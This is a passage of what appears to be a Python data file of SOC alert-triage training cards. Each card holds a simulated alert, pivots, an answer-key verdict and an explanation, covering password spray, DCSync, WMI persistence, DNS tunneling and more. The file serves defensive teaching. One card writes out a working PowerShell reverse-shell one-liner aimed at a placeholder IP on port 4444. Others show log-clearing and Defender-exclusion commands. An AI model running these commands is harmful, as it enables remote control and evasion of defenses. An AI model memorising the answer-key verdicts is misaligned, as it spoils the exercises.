    "pivots": {
        "related": "Query: {user} device + SharePoint audit, 2h\n→ Deletions came from the user's own compliant device via OneDrive sync\n→ 30 min before: user moved folder tree to a new site '{dept}-Archive-2026' (2,340 creates there)\n→ No encryption-pattern renames, no external sharing, files intact in new location + recycle bin",
        "asset": "SharePoint site '{dept}-Shared'. Versioning + 93-day recycle bin enabled.",
        "user": "{user} — {dept} team lead. Helpdesk ticket from this morning: 'reorganizing our shared library, moving old projects to archive'.",
        "reputation": "No external IPs involved; all activity from corporate device.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "user"],
    "what_to_check": "Where did files GO (moved vs destroyed), encryption/rename patterns, external sharing, user's own stated intent (ticket), recoverability.",
    "explanation": "Mass 'deletion' that is actually one leg of a folder move — matching creates in the archive site, recycle bin intact, user announced the reorg in a ticket. No ransomware signals (no rename-to-extension pattern, no encryption). Close. The discipline here: verify the CREATE side before reacting to the DELETE side of any mass-file alert.",
},
{
    "id": "sent_token_anomaly",
    "source": "Microsoft Sentinel",
    "event_type": "Session token theft / replay",
    "mitre": "T1550.004 – Web Session Cookie",
    "alert": (
        "Sentinel Incident: Anomalous token — unfamiliar sign-in properties\n"
        "User: {admin}@corp.example.com (Global Reader + Security Reader)\n"
        "Detail: Session token replayed from new IP {ext_ip}; original MFA claim reused, no fresh MFA prompt\n"
        "Severity: High"
    ),
    "pivots": {
        "related": "Query: {admin} sessions + AuditLogs, 24h\n→ Original session: corporate device, Sacramento. Replayed token: {ext_ip}, different OS fingerprint (Linux vs Windows)\n→ Via replayed session: enumerated Entra users, downloaded sign-in logs, listed Conditional Access policies\n→ 2h earlier: {admin} reported a 'weird login page after clicking a Teams link' to helpdesk",
        "asset": "Entra ID tenant — account holds read access to security configuration.",
        "user": "{admin} — IT admin. AiTM phishing report in helpdesk ticket matches token theft timeline.",
        "reputation": "{ext_ip} → hosting provider, {bad_country}; ASN associated with AiTM phishing kits (Evilginx-style) in recent reports.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Device/OS fingerprint mismatch between original and replayed session, MFA claim reuse without prompt, what the session DID, correlated phishing report.",
    "explanation": "Token replay from a different OS on AiTM-associated infrastructure, with the victim's own 'weird login page' report two hours earlier — adversary-in-the-middle token theft. MFA was not bypassed, it was STOLEN with the session. Escalate: revoke sessions/refresh tokens immediately; password reset alone does not kill a stolen token. The recon it performed (CA policies, sign-in logs) suggests the attacker is planning next steps in the tenant.",
    "event_type_pool": ["Impossible travel — compromised credentials", "Suspicious remote logon", "Privileged logon — expected service activity", "MFA fatigue / push bombing"],
},

# ===================== WINDOWS SECURITY (expansion) =====================
{
    "id": "win_4740_spray",
    "source": "Windows Security",
    "event_type": "Password spray / distributed lockout",
    "mitre": "T1110.003 – Password Spraying",
    "alert": (
        "EventID: 4740 (A user account was locked out)\n"
        "Caller Computer: DC-01\n"
        "Multiple accounts locked in a short window\n"
        "Time: {hh_off} PT"
    ),
    "pivots": {
        "related": "Query: 4740 + 4625 domain-wide, last 20 min\n→ 23 different accounts locked out\n→ All 4625s from source {ext_ip}, only 1–2 password attempts PER account (spray, not brute)\n→ Passwords tried are seasonal: 'Summer2026!', 'Company123'\n→ 1 account did NOT lock and has a successful 4624 from {ext_ip}",
        "asset": "Domain-wide (Active Directory). Lockout policy: 5 attempts / 15 min.",
        "user": "Locked accounts span {dept} and others — no common team or manager. Pattern = account enumeration, not one targeted user.",
        "reputation": "{ext_ip} → AbuseIPDB 87/100, geo {bad_country}, tagged: authentication abuse.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Many accounts vs one account, attempts-PER-account (spray = few per account across many accounts), single common source IP, any account that succeeded instead of locking.",
    "explanation": "Low-and-slow attempts against many accounts from one external IP with seasonal passwords is a password spray — and one account already authenticated, which is a live foothold, not just noise. Escalate: block the source, force-reset the account that succeeded, and hunt its session. The tell that separates this from a single-user lockout is the account BREADTH.",
    "event_type_pool": ["Brute force / password guessing", "Failed logon — user error", "Account lockout — stale cached credential", "Kerberoasting"],
},
{
    "id": "win_4740_mobile",
    "source": "Windows Security",
    "event_type": "Account lockout — stale cached credential",
    "mitre": "T1110 – Brute Force (ruled out)",
    "alert": (
        "EventID: 4740 (A user account was locked out)\n"
        "Target Account: {user}\n"
        "Caller Computer: DC-01\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: 4740 + 4625 for {user}, last 4h\n→ Only {user} locked out — no other accounts\n→ 4625s originate from EAS/ActiveSync + an internal Wi-Fi controller, Logon Type 3\n→ Repeats every ~30 min in bursts of 5 (matches phone mail-resync interval)",
        "asset": "Domain account. Lockout policy: 5 / 15 min.",
        "user": "{user} — {dept}. Password reset yesterday (helpdesk ticket #HD-4501). Owns an enrolled iPhone; old password still cached in the mail app.",
        "reputation": "Sources are internal (Wi-Fi controller + Exchange ActiveSync). No external IP.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "user"],
    "what_to_check": "One account vs many, whether sources are internal mobile/EAS, recent password reset, whether the failure interval matches a device resync cycle.",
    "explanation": "A single account locking on a repeating ~30-min cycle from EAS/Wi-Fi after a password reset is a phone still presenting the old cached password — classic self-inflicted lockout, not an attack. Close with a note to have the user update the saved password on their device. Contrast with the spray card: one account + internal source + resync cadence is the opposite of many-accounts + external + seasonal-passwords.",
    "event_type_pool": ["Password spray / distributed lockout", "Brute force / password guessing", "Suspicious remote logon", "Failed logon — user error"],
},
{
    "id": "win_4728_da_offhours",
    "source": "Windows Security",
    "event_type": "Privileged group modification — unauthorized",
    "mitre": "T1098 – Account Manipulation",
    "alert": (
        "EventID: 4728 (Member added to a security-enabled global group)\n"
        "Group: Domain Admins\n"
        "Member Added: {user}\n"
        "Performed By: {admin}\n"
        "Computer: DC-01\n"
        "Time: {hh_off} PT"
    ),
    "pivots": {
        "related": "Query: {admin} activity, ±60 min\n→ {admin} session on DC-01 originated (4624 Type 3) from {int_ip} — a {dept} workstation, not an admin host\n→ 4728 add {user} to Domain Admins → no corresponding removal → 4672 for {user} on {srv} 5 min later\n→ {user} is a standard {dept} user, never previously privileged",
        "asset": "Domain Admins group — highest-privilege AD group. Change origin: {int_ip}.",
        "user": "{admin} — IT admin. Change calendar: NO approved change tonight. {user} — {dept}, standard user, no role requiring DA.",
        "reputation": "{int_ip} — internal {dept} workstation. No admin function; should not be issuing DA changes.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Which group (Domain Admins is crown-jewel), was there a change ticket, where did the admin session originate, is the added user someone who should ever hold that privilege.",
    "explanation": "Adding a standard user to Domain Admins off-hours, with no change ticket, from a non-admin workstation, followed immediately by privileged use — this is privilege escalation / persistence with compromised admin credentials. Escalate now: both {admin} and the origin workstation need containment, and the DA membership should be pulled. Do not wait for 'confirmation' on a Domain Admins change.",
    "event_type_pool": ["Group membership change — onboarding", "Unauthorized account creation", "Privileged logon — expected service activity", "DCSync / replication rights abuse"],
},
{
    "id": "win_4732_onboard",
    "source": "Windows Security",
    "event_type": "Group membership change — onboarding",
    "mitre": "T1098 – Account Manipulation (ruled out)",
    "alert": (
        "EventID: 4732 (Member added to a security-enabled local group)\n"
        "Group: Remote Desktop Users\n"
        "Member Added: {user}\n"
        "Performed By: {admin}\n"
        "Computer: {srv}\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {admin} + {user}, last 8h\n→ Part of a batch: 4 new hires added to Remote Desktop Users on {srv} in a 10-min window this morning\n→ {admin} session from the IT admin subnet (10.10.5.0/24) via the standard PAW",
        "asset": "{srv} — {dept} application server, standard RDP access group. Not a DC.",
        "user": "{user} — new {dept} hire, start date today. HR onboarding ticket ONB-7788 lists RDP to {srv} as required access.",
        "reputation": "Origin: IT admin subnet, privileged access workstation. Expected.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "user"],
    "what_to_check": "Which group (RDP Users ≠ Domain Admins), is there an onboarding/access ticket, does the change come in a batch during business hours from the proper admin path.",
    "explanation": "Adding a documented new hire to a non-privileged RDP group during business hours from the admin PAW, matching an onboarding ticket, is routine IAM. Close, reference ONB-7788. The discipline: a group-membership alert is only as serious as the group — Remote Desktop Users during onboarding is noise; the exact same event against Domain Admins off-hours is an incident.",
    "event_type_pool": ["Privileged group modification — unauthorized", "Unauthorized account creation", "Suspicious remote logon", "DCSync / replication rights abuse"],
},
{
    "id": "win_1102_logclear",
    "source": "Windows Security",
    "event_type": "Security log cleared — anti-forensics",
    "mitre": "T1070.001 – Clear Windows Event Logs",
    "alert": (
        "EventID: 1102 (The audit log was cleared)\n"
        "Subject Account: {admin}\n"
        "Computer: {srv}\n"
        "Time: {hh_off} PT"
    ),
    "pivots": {
        "related": "Query: {srv} + {admin}, before/after the gap\n→ 30 min prior: RDP 4624 Type 10 from {ext_ip} as {admin}\n→ Then: 4688 wevtutil cl Security, wevtutil cl System\n→ Security log has a hole from the logon to the clear; Sysmon (separate channel) still shows reg Run-key writes in the gap",
        "asset": "{srv} — application server. Criticality: HIGH.",
        "user": "{admin} — IT admin. No maintenance or reimaging change scheduled. Log clearing is not part of any documented procedure here.",
        "reputation": "{ext_ip} → external, geo {bad_country}, first-seen. Not the VPN egress range.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Who cleared it and from where, is there any legitimate reason (reimage/maintenance), what other log channels (Sysmon/EDR) still show for the gap window.",
    "explanation": "Clearing the Security event log has essentially no routine operational reason and here it follows an external RDP session and precedes persistence still visible in Sysmon — this is anti-forensics covering hands-on-keyboard activity. Escalate for isolation and pull the surviving telemetry (Sysmon/EDR/network) to reconstruct the gap. Treat 1102 outside a documented reimage as an incident by default.",
    "event_type_pool": ["Suspicious remote logon", "Living-off-the-land binary abuse", "Privileged logon — expected service activity", "Scheduled task creation — legitimate software"],
},
{
    "id": "win_7045_psexec",
    "source": "Windows Security",
    "event_type": "Remote service execution — lateral movement",
    "mitre": "T1569.002 – Service Execution",
    "alert": (
        "EventID: 7045 (A new service was installed)\n"
        "Service Name: PSEXESVC\n"
        "Service File: C:\\Windows\\PSEXESVC.exe\n"
        "Service Type: user mode service\n"
        "Start Type: demand start\n"
        "Computer: {srv}"
    ),
    "pivots": {
        "related": "Query: {srv}, ±20 min\n→ Preceding 4624 Type 3 as {admin} from {int_ip}\n→ PSEXESVC installed → cmd.exe → powershell downloading from {ext_ip}\n→ Same PSEXESVC pattern appeared on 3 other servers in the last hour, spreading from {int_ip}",
        "asset": "{srv} — file server. Criticality: HIGH. PsExec is not part of the standard admin toolchain here (they use WinRM/SCCM).",
        "user": "{admin} — IT admin, but this session originates from {int_ip}, a {dept} workstation, not an admin host. No change ticket.",
        "reputation": "{ext_ip} → VT 22/94, payload host. {int_ip} → internal {dept} workstation, now the apparent pivot point.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "asset"],
    "what_to_check": "Service name/binary (PSEXESVC, random 8-char names), where the installing session came from, whether the same service is appearing across multiple hosts (spread), what ran after.",
    "explanation": "PSEXESVC installed from a non-admin workstation and then repeating across several servers in an hour is lateral movement with a stolen admin credential. Even though PsExec is a legitimate tool, the origin, the spread, and the payload download make this hands-on-keyboard movement. Escalate: isolate the pivot workstation {int_ip}, and scope every host that got the service.",
    "event_type_pool": ["Scheduled task creation — legitimate software", "Administrative script — expected activity", "Suspicious remote logon", "Persistence via registry run key"],
},
{
    "id": "win_4662_dcsync",
    "source": "Windows Security",
    "event_type": "DCSync / replication rights abuse",
    "mitre": "T1003.006 – DCSync",
    "alert": (
        "EventID: 4662 (An operation was performed on an object)\n"
        "Account: {user}\n"
        "Object Type: domainDNS\n"
        "Properties: DS-Replication-Get-Changes-All {{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}}\n"
        "Computer: DC-01\n"
        "Time: {hh_off} PT"
    ),
    "pivots": {
        "related": "Query: {user} + DC-01, ±30 min\n→ 4624 Type 3 as {user} on DC-01 from {int_ip}\n→ 4662 requesting replication of ALL directory changes (DCSync)\n→ {user} is NOT a domain controller computer account — only DCs replicate\n→ Followed by outbound to {ext_ip}",
        "asset": "DC-01 — domain controller. Requesting account should be a DC computer account, not a user.",
        "user": "{user} — {dept} standard user. Has no administrative or replication role. Should never trigger directory replication.",
        "reputation": "{int_ip} — internal {dept} workstation. {ext_ip} → external, {bad_country}.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Is the replicating principal a real DC computer account or a user, the DS-Replication-Get-Changes-All GUID, source of the session, what left the network after.",
    "explanation": "A normal user account invoking directory replication (DS-Replication-Get-Changes-All) is DCSync — the attacker is pulling password hashes straight from the DC, which means full domain compromise is imminent or done. Only domain controllers should replicate. Escalate at top priority: this is a domain-wide credential theft event; expect a golden-ticket / krbtgt reset conversation with IR.",
    "event_type_pool": ["Privileged logon — expected service activity", "Privileged group modification — unauthorized", "Credential dumping attempt", "Suspicious remote logon"],
},

# ===================== POWERSHELL (expansion) =====================
{
    "id": "ps_defender_exclusion_mal",
    "source": "PowerShell",
    "event_type": "Defender tampering — exclusion added",
    "mitre": "T1562.001 – Impair Defenses",
    "alert": (
        "EventID: 4104 (Script Block Logging)\n"
        "Host: {wks}\n"
        "User: {user}\n"
        "ScriptBlock: Add-MpPreference -ExclusionPath C:\\Users\\{user}\\AppData\\Local\\Temp -ExclusionExtension .exe,.dll\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {wks}, ±15 min\n→ Parent chain: WINWORD.EXE → powershell.exe (hidden)\n→ Add-MpPreference exclusion set → 90 s later an .exe written to that exact Temp path and executed\n→ No SCCM/Intune policy push in the fleet management log for this change",
        "asset": "{wks} — standard workstation, {dept}. Managed by Intune; exclusions are set centrally, never ad-hoc.",
        "user": "{user} — {dept}, not IT, no admin role. No reason to modify Defender settings.",
        "reputation": "The dropped .exe → VT 31/94. No approved change for a Defender exclusion on this device.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Who set the exclusion (central management vs ad-hoc user), does the excluded path immediately receive a payload, is there any approved change, parent process.",
    "explanation": "Carving a Defender exclusion for the Temp folder right before dropping an exe there is a textbook 'blind the AV, then run' sequence — and it was done by a non-IT user with no policy push behind it. Escalate. The same cmdlet is benign when it comes from Intune/SCCM with a ticket; the discriminator is ORIGIN and the payload that lands in the excluded path.",
    "event_type_pool": ["Defense evasion attempt", "Administrative script — expected activity", "Malicious script execution", "Persistence via registry run key"],
},
{
    "id": "ps_defender_exclusion_it",
    "source": "PowerShell",
    "event_type": "Defender exclusion — managed policy",
    "mitre": "T1562.001 – Impair Defenses (ruled out)",
    "alert": (
        "EventID: 4104 (Script Block Logging)\n"
        "Host: {wks}\n"
        "User: SYSTEM\n"
        "ScriptBlock: Add-MpPreference -ExclusionPath 'C:\\Program Files\\LOB-ERP\\cache' -ExclusionProcess erp-agent.exe\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: same exclusion fleet-wide, last 24h\n→ Applied to 640 endpoints via Intune device-config profile, uniform, in device-enrollment order\n→ Parent: the Intune management extension (SYSTEM context), not an interactive shell\n→ Excluded path is a signed LOB app directory in Program Files",
        "asset": "{wks} — standard managed workstation. Exclusion targets the corporate ERP client.",
        "user": "SYSTEM via Intune. Change ticket CHG-3120: 'Add Defender exclusion for LOB-ERP to fix scan-induced latency' — APPROVED.",
        "reputation": "Excluded path/process both signed by the ERP vendor, in Program Files, not user-writable.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "user"],
    "what_to_check": "Delivered by central management (Intune/SCCM, SYSTEM) vs ad-hoc, uniform fleet rollout, is the excluded path a protected signed app dir, matching change ticket.",
    "explanation": "A Defender exclusion for a signed ERP app pushed to 640 devices by Intune under an approved change is normal endpoint management — vendors legitimately need scan exclusions for performance. Close, reference CHG-3120. The paired malicious card uses the identical cmdlet from a user shell against a user-writable Temp path that then receives a payload; the cmdlet is never the verdict, the context is.",
    "event_type_pool": ["Defender tampering — exclusion added", "Defense evasion attempt", "Administrative script — expected activity", "Malicious script execution"],
},
{
    "id": "ps_encoded_benign",
    "source": "PowerShell",
    "event_type": "Encoded command — documented maintenance",
    "mitre": "T1059.001 – PowerShell (ruled out)",
    "alert": (
        "EventID: 4104 (Script Block Logging)\n"
        "Host: {srv}\n"
        "User: svc.sccm\n"
        "ScriptBlock (decoded from -EncodedCommand):\n"
        "Get-ChildItem C:\\Logs -Recurse | Where-Object LastWriteTime -lt (Get-Date).AddDays(-30) | Remove-Item -Force\n"
        "Time: 03:00 PT"
    ),
    "pivots": {
        "related": "Query: svc.sccm on {srv}, last 30 days\n→ Identical -EncodedCommand runs every night at 03:00, 30-day baseline, parent CcmExec.exe\n→ No network activity; purely local file cleanup\n→ -EncodedCommand used only because the scheduled action string contained quotes/pipes",
        "asset": "{srv} — application server. Nightly housekeeping in scope.",
        "user": "svc.sccm — documented SCCM service account. Scheduled maintenance task 'Log rotation', owner IT Operations.",
        "reputation": "No network indicators. Decoded script is benign local log cleanup.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "user"],
    "what_to_check": "DECODE the command first, parent process, is it a recurring baselined job, any network activity, does the decoded content actually do anything malicious.",
    "explanation": "-EncodedCommand is an encoding convenience, not a threat indicator — decoded here it is a benign nightly log-cleanup on a 30-day baseline from the SCCM agent. Close. The lesson pairs directly with the malicious encoded-command card: never verdict on '-enc present' alone; decode it, then judge the CONTENT (download-cradle to a bad IP vs Remove-Item on old logs).",
    "event_type_pool": ["Malicious script execution", "Defense evasion attempt", "Administrative script — expected activity", "Reverse shell / interactive C2"],
},
{
    "id": "ps_revshell",
    "source": "PowerShell",
    "event_type": "Reverse shell / interactive C2",
    "mitre": "T1059.001 – PowerShell",
    "alert": (
        "EventID: 4104 (Script Block Logging)\n"
        "Host: {wks}\n"
        "User: {user}\n"
        "ScriptBlock: $c=New-Object Net.Sockets.TCPClient('{ext_ip}',4444);$s=$c.GetStream();"
        "[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}}\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {wks}, ±15 min\n→ Parent: an .hta opened from a browser download → powershell -nop -w hidden\n→ Persistent outbound TCP session to {ext_ip}:4444 (Sysmon 3), long-lived, bidirectional\n→ Interactive commands seen in later 4104 blocks: whoami, ipconfig, net view",
        "asset": "{wks} — standard workstation, {dept}.",
        "user": "{user} — {dept}, no scripting/dev role. No PowerShell in 90-day baseline.",
        "reputation": "{ext_ip} → VT 18/94, port 4444 (Metasploit/Meterpreter default). Geo {bad_country}.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "TCPClient + GetStream + iex loop (interactive shell), long-lived outbound socket to a raw IP, port 4444, follow-on interactive recon commands.",
    "explanation": "A TCPClient-to-iex read loop IS a reverse shell — there is no benign version of this pattern on a {dept} user's workstation. The live socket to a 4444 C2 and the hands-on recon that follows confirm an interactive operator. Escalate for immediate isolation and credential reset; this is an active session, treat it as time-critical.",
    "event_type_pool": ["Malicious script execution", "Defense evasion attempt", "Living-off-the-land binary abuse", "Encoded command — documented maintenance"],
},
{
    "id": "ps_iwr_internal",
    "source": "PowerShell",
    "event_type": "Internal artifact download — admin task",
    "mitre": "T1059.001 – PowerShell (ruled out)",
    "alert": (
        "EventID: 4104 (Script Block Logging)\n"
        "Host: {srv}\n"
        "User: {admin}\n"
        "ScriptBlock: Invoke-WebRequest -Uri http://sccm.corp.local/pkg/agent-2.9.msi -OutFile C:\\Temp\\agent-2.9.msi\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {srv} + {admin}, ±30 min\n→ Session origin: IT admin subnet 10.10.5.0/24 via PAW\n→ IWR target resolves to the INTERNAL SCCM distribution point (sccm.corp.local, 10.10.5.40)\n→ Followed by msiexec install of the signed corporate agent; no outbound internet",
        "asset": "{srv} — application server. Pulling a corporate software package from the internal DP.",
        "user": "{admin} — IT admin. Runbook RUN-114 'Manual agent redeploy' documents this exact IWR-then-msiexec step.",
        "reputation": "sccm.corp.local → internal, corporate PKI. MSI is signed by the corporate code-signing cert.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Where does the URL resolve (internal DP vs internet), is the target signed/corporate, session origin (admin PAW), does it match a runbook.",
    "explanation": "Invoke-WebRequest is dual-use; here it pulls a signed corporate MSI from the INTERNAL SCCM distribution point during a documented admin task from the PAW — routine ops, not a download-cradle. Close, reference RUN-114. The malicious cousin (IEX DownloadString from a raw external IP) differs on exactly two pivots: the URL destination and the reputation of what it fetches.",
    "event_type_pool": ["Malicious script execution", "Reverse shell / interactive C2", "Administrative script — expected activity", "Defender exclusion — managed policy"],
},

# ===================== SYSMON (expansion) =====================
{
    "id": "sysmon_wmi_persist",
    "source": "Sysmon",
    "event_type": "WMI event subscription persistence",
    "mitre": "T1546.003 – WMI Event Subscription",
    "alert": (
        "Sysmon EventID: 21 (WmiEvent — Consumer To Filter binding)\n"
        "Consumer: CommandLineEventConsumer 'SysUpdater'\n"
        "Command: powershell -w hidden -enc <base64>\n"
        "Filter: __EventFilter triggering at system startup\n"
        "Computer: {srv}\n"
        "User: {admin}"
    ),
    "pivots": {
        "related": "Query: {srv}, ±30 min + WMI repo\n→ Consumer runs hidden encoded PowerShell that beacons to {ext_ip} on startup\n→ Created via wmic ... CommandLineEventConsumer 6 min after an RDP session from {int_ip}\n→ No management tool (SCCM/Intune) creates WMI CommandLineEventConsumers in this environment",
        "asset": "{srv} — application server. Criticality: HIGH.",
        "user": "{admin} — IT admin, but session came from {int_ip} ({dept} workstation), no change ticket. WMI persistence is not part of any documented process.",
        "reputation": "{ext_ip} → C2 infrastructure, {bad_country}. Decoded consumer command is a download-and-run.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "CommandLineEventConsumer running hidden/encoded PowerShell, startup trigger, who created it and from where, whether any legit tool uses WMI consumers here.",
    "explanation": "A WMI CommandLineEventConsumer that fires hidden encoded PowerShell at startup is a stealth persistence mechanism (survives reboots, lives in the WMI repo, not on disk). Created off a non-admin session with no ticket and pointing at C2 — escalate. WMI subscription persistence is almost never a legitimate ad-hoc admin action; treat it as an intrusion artifact.",
    "event_type_pool": ["Persistence via registry run key", "Scheduled task creation — legitimate software", "Administrative script — expected activity", "Defense evasion attempt"],
},
{
    "id": "sysmon_namedpipe_cs",
    "source": "Sysmon",
    "event_type": "C2 named pipe / process injection",
    "mitre": "T1055 – Process Injection",
    "alert": (
        "Sysmon EventID: 17 (Pipe Created)\n"
        "PipeName: \\\\.\\pipe\\msagent_a1\n"
        "Image: C:\\Windows\\System32\\rundll32.exe\n"
        "Computer: {wks}\n"
        "User: {user}"
    ),
    "pivots": {
        "related": "Query: {wks}, ±15 min\n→ rundll32.exe launched with NO command-line arguments (spawned to host injected code, not to run a DLL)\n→ Named pipe matches a known Cobalt Strike default pattern (msagent_##)\n→ rundll32 then makes outbound 443 to {ext_ip} with a fixed jittered interval (Sysmon 3)",
        "asset": "{wks} — standard workstation, {dept}.",
        "user": "{user} — {dept}. Not IT. rundll32 with no arguments has no legitimate user workflow.",
        "reputation": "{ext_ip} → flagged C2, {bad_country}. Pipe name + argless rundll32 + jittered beacon = post-exploitation framework.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Named-pipe pattern matching known C2 frameworks, argless rundll32/regsvr32 (injection host), jittered beaconing, outbound reputation.",
    "explanation": "An argless rundll32 hosting a named pipe that matches a Cobalt Strike default, then beaconing on a jittered interval, is injected C2 — the pipe is the framework's internal comms channel. Escalate for isolation. Named-pipe IOCs plus argless LOLBin plus jitter is a high-confidence framework signature; do not close it as 'just rundll32'.",
    "event_type_pool": ["Living-off-the-land binary abuse", "Credential dumping attempt", "Persistence via registry run key", "DNS tunneling / exfiltration"],
},
{
    "id": "sysmon_dns_tunnel",
    "source": "Sysmon",
    "event_type": "DNS tunneling / exfiltration",
    "mitre": "T1071.004 – Application Layer Protocol: DNS",
    "alert": (
        "Sysmon EventID: 22 (DNS Query)\n"
        "QueryName: a8f3d9c1e07b4a2f9c6d.data.sync-telemetry[.]xyz\n"
        "QueryType: TXT\n"
        "Image: C:\\Users\\{user}\\AppData\\Roaming\\upd\\svc.exe\n"
        "Computer: {wks}"
    ),
    "pivots": {
        "related": "Query: {wks} DNS, last 1h\n→ 3,400 TXT queries to *.sync-telemetry[.]xyz, each label a long random-looking string (encoded data)\n→ Steady ~1 query/sec; response sizes near the max — classic tunnel\n→ Querying process is an unsigned exe in AppData\\Roaming, not a browser",
        "asset": "{wks} — standard workstation, {dept}.",
        "user": "{user} — {dept}. No tooling that would generate thousands of TXT lookups.",
        "reputation": "sync-telemetry[.]xyz → registered 9 days ago, no legitimate service, single NS in {bad_country}. Querying binary → VT 27/94.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "TXT query volume and rate, random high-entropy subdomains, young domain, is the querying process a browser or an unknown binary, response sizes.",
    "explanation": "Thousands of TXT queries with high-entropy labels to a 9-day-old domain from an unsigned AppData binary is DNS tunneling — data or C2 smuggled over DNS to dodge web proxies. Escalate for isolation and block the domain at the resolver. The volume + entropy + TXT type + young domain together are unambiguous; one stray odd lookup would not be.",
    "event_type_pool": ["C2 named pipe / process injection", "CDN / cloud service lookup — benign", "Persistence via registry run key", "Malicious script execution"],
},
{
    "id": "sysmon_dns_cdn_fp",
    "source": "Sysmon",
    "event_type": "CDN / cloud service lookup — benign",
    "mitre": "T1071 – Application Layer Protocol (ruled out)",
    "alert": (
        "Sysmon EventID: 22 (DNS Query)\n"
        "QueryName: d2k3f9x1a7.cloudfront[.]net\n"
        "QueryType: A\n"
        "Image: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\n"
        "Computer: {wks}"
    ),
    "pivots": {
        "related": "Query: {wks} DNS, last 1h\n→ A-record lookups (not TXT) to random-looking *.cloudfront[.]net and *.akamaiedge[.]net hostnames\n→ Low volume, tied to normal web browsing; each resolves to AWS/Akamai CDN ranges\n→ Querying process is the signed Chrome browser",
        "asset": "{wks} — standard workstation, {dept}.",
        "user": "{user} — {dept}. Active web browsing during business hours; CDN-fronted sites are normal.",
        "reputation": "cloudfront[.]net / akamaiedge[.]net → major CDNs. Random labels are per-object cache keys, not exfil. Resolve to cloud-provider ASNs.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Query TYPE (A vs TXT), the parent domain (major CDN vs unknown young domain), volume, whether the querying process is a browser, where it resolves.",
    "explanation": "Random-looking hostnames under a major CDN (CloudFront/Akamai) queried by a signed browser at low volume are cache keys, not tunneled data — 'high-entropy subdomain' alone is not tunneling. Close; consider suppressing well-known CDN parent domains in the rule. The paired tunneling card differs on the discriminators: TXT type, thousands/hour, a 9-day-old domain, and an unsigned AppData process.",
    "event_type_pool": ["DNS tunneling / exfiltration", "C2 named pipe / process injection", "Reverse shell / interactive C2", "Malicious script execution"],
},
{
    "id": "sysmon_byovd",
    "source": "Sysmon",
    "event_type": "Vulnerable driver load (BYOVD)",
    "mitre": "T1068 – Exploitation for Privilege Escalation",
    "alert": (
        "Sysmon EventID: 6 (Driver Loaded)\n"
        "ImageLoaded: C:\\Users\\{user}\\AppData\\Local\\Temp\\RTCore64.sys\n"
        "Signed: true (MICRO-STAR / third-party, valid signature)\n"
        "Computer: {wks}"
    ),
    "pivots": {
        "related": "Query: {wks}, ±20 min\n→ A dropped exe loaded RTCore64.sys from Temp (a known-vulnerable MSI Afterburner driver abused for kernel R/W)\n→ Immediately after: attempts to disable the EDR driver / tamper with kernel callbacks\n→ Host has no MSI hardware or overclocking software installed",
        "asset": "{wks} — standard corporate workstation, {dept}. No gaming/overclocking software in the build.",
        "user": "{user} — {dept}. No reason to load a third-party kernel driver from Temp.",
        "reputation": "RTCore64.sys → signed but on the vulnerable-driver blocklist (LOLDrivers). Dropping exe → VT 33/94.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "asset"],
    "what_to_check": "Driver name against known-vulnerable lists (RTCore64, dbutil, etc.), load path (Temp/AppData ≠ legit), does the host actually have the parent product, what happens right after the load.",
    "explanation": "A validly-signed but known-vulnerable driver (RTCore64) loaded from Temp on a machine with no reason to have it is Bring-Your-Own-Vulnerable-Driver — the attacker uses its kernel R/W to kill EDR and escalate. 'Signed: true' is a trap here; the signature is real, the driver is still an attack tool. Escalate for isolation before the EDR gets blinded.",
    "event_type_pool": ["Living-off-the-land binary abuse", "Defense evasion attempt", "Scheduled task creation — legitimate software", "Credential dumping attempt"],
},
{
    "id": "sysmon_dll_sideload",
    "source": "Sysmon",
    "event_type": "DLL search-order hijack / sideload",
    "mitre": "T1574.002 – DLL Side-Loading",
    "alert": (
        "Sysmon EventID: 7 (Image Loaded)\n"
        "Image: C:\\Users\\{user}\\AppData\\Local\\Temp\\onedrive\\OneDrive.exe (signed, Microsoft)\n"
        "ImageLoaded: C:\\Users\\{user}\\AppData\\Local\\Temp\\onedrive\\version.dll\n"
        "Signed: false\n"
        "Computer: {wks}"
    ),
    "pivots": {
